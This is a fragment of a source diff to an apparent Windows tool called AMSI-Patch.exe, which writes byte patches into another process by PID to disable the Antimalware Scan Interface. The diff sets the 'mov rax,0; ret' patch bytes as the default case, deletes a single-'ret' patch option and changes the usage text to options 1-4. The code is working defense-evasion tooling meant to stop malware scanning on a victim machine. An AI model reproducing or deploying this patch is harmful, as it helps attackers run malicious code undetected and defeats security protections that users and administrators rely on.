@@ -57,19 +57,12 @@ void patchAMSI(HANDLE& hProc, int PatchNbr) {
             break;
         
         case 4:
+        default:
             /*
                 0:  48 c7 c0 00 00 00 00    mov    rax,0x0
                 7:  c3                      ret
             */
             lstrcatA(amsiPatch, "\x48\xC7\xC0\x00\x00\x00\x00\xC3");
-            break;
-        
-        case 5:
-        default:
-            /*
-                0:  c3                      ret
-            */
-            lstrcatA(amsiPatch, "\xC3");
             break;
         
 
@@ -106,7 +99,7 @@ int main(int argc, char** argv) {
     HANDLE hProc;
 
     if (argc < 3) {
-        printf("USAGE: AMSI-Patch.exe <PID> <PatchNbr (from 1-5)>\n");
+        printf("USAGE: AMSI-Patch.exe <PID> <PatchNbr (from 1-4)>\n");
         return 1;
     }
     
